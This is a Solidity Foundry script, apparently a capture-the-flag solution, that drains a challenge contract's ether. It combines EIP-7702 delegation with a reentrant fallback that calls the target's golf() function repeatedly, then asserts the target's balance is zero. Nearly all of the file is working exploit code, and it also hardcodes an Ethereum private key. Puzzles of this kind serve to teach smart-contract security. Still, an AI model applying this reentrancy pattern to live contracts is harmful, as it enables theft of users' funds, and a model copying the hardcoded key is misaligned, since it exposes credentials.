// SPDX-License-Identifier: MIT
// Author: Hanz
pragma solidity ^0.8.0;

// forge script script/Solve.s.sol:Solve --rpc-url $ETH_RPC_URL --evm-version prague --slow --no-cache

import {Script, console} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";

interface IChallenge {
	function golf() external;
}

contract Solve is Script {
	IChallenge c = IChallenge(vm.envAddress("TARGET"));
	uint PK;
	Attack a;

	function run() public {
		// ETH Address: 0x00001e904107dde914947f7B75C97C2bA37AFCa2
		// ETH Privkey: 0x8df30866d1ccb611ca8a5b6d9130001b2136191b444445353904880e8527d068
		PK = 0x8df30866d1ccb611ca8a5b6d9130001b2136191b444445353904880e8527d068;
		vm.startBroadcast(PK);
		a = new Attack();

		// forge script is broken here.
		Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(a), PK);
		vm.attachDelegation(signedDelegation);
		(bool success,) = address(0).call("");
		require(success, "EIP-7702 setup incorrectly fails");

		Attack(payable(vm.addr(PK))).setup(address(c));
		console.log(address(c).balance);
		c.golf();
		console.log(address(c).balance);

		assert(address(c).balance == 0);
	}
}

contract Attack {
	IChallenge c;
	uint iteration;

	constructor() { /* EIP7702 */ }

	function setup(address _c) external {
		c = IChallenge(_c);
	}

	fallback() external payable {
		iteration++;
		if (iteration < 10) {
			c.golf();
		}
		
		assembly {
			mstore(0, 1)
			return(0, 32)
		}
	}
}